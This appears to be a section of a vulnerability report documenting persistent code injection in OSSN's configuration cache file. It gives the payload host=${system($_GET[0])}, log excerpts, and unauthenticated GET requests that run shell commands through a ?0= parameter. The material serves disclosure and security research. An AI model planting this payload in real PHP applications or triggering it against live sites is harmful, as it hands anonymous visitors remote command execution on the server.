## e05: Persistence property - injected code runs on EVERY request (stored code injection, not one-shot)

Excerpts from the php -S stderr log (/tmp/ossn-php-server.log) while configurations/ossn.config.dcache.php contained host=${system($_GET[0])}:

1) A POST that does not carry a ?0= query runs system('') at bootstrap; cmd.exe raises an error that aborts the request before the action runs - i.e. the payload even interferes with subsequent admin requests:
   #0 ...configurations\ossn.config.dcache.php(15): system('')
   #1 ...system\start.php(34): include_once('...')
   #2 ...system\handlers\actions.php(12): require_once('...')
   #3 {main}
   thrown in ...configurations\ossn.config.dcache.php on line 15

2) An unauthenticated GET /index.php?0=zzz executes cmd with attacker value 'zzz' (Windows cmd rejects it, but execution happened):
   'zzz' 不是内部或外部命令，也不是可运行的程序 (cmd: 'zzz' is not recognized as an internal or external command)
   PHP Warning: Undefined variable $ in ...configurations\ossn.config.dcache.php on line 15
   [302]: GET /index.php?0=zzz

3) A GET with an executable command prints its output at the very start of the response body, before any application HTML:
   GET /index.php?0=echo%20ALIVE-CHECK  ->  body begins 'ALIVE-CHECK'

Conclusion: the written file is re-included by system/start.php:34 on every request (install, login page, actions, admin pages); any visitor (even unauthenticated) triggers the attacker-controlled code, and it survives until an administrator rewrites the cache settings.
